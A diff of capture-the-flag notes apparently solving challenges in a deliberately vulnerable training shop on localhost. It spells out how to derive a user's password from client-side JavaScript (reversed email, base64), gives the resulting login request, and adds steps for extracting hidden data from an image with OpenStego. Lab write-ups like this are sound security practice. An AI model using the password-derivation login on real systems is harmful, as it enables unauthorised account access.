@@ -285,15 +285,52 @@ bash > timedatectl set-ntp 0 > timedatectl set-time '2019-03-08' <br>
 
 ### Login Bjoern
 firefox > Debugger > search: oauth <br>
-bash > cat main1.js | grep password:
-password: btoa(e.email.split("").reverse().join("")),
-email: bjoern.kimminich@gmail.com
-moc.liamg@hcinimmik.nreojb
-bash > echo -n moc.liamg@hcinimmik.nreojb | base64
-bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
-http://localhost:3000/#/login
-POST /rest/user/login HTTP/1.1
-{"email":"bjoern.kimminich@gmail.com","password":"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="}
+bash > cat main1.js | grep password: <br>
+password: btoa(e.email.split("").reverse().join("")),<br>
+email: bjoern.kimminich@gmail.com<br>
+moc.liamg@hcinimmik.nreojb<br>
+bash > echo -n moc.liamg@hcinimmik.nreojb | base64<br>
+bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=<br>
+http://localhost:3000/#/login<br>
+POST /rest/user/login HTTP/1.1<br>
+{"email":"bjoern.kimminich@gmail.com","password":"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="}<br>
+
+### Steganography
+http://localhost:3000/#/about<br>
+firefox > inspect photo
+http://localhost:3000/assets/public/images/carousel/5.png
+sudo dpkg -i openstego_0.8.6-1_all.deb
+openstego > extract data
+http://localhost:3000/#/contact
+comment > pickle rick
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
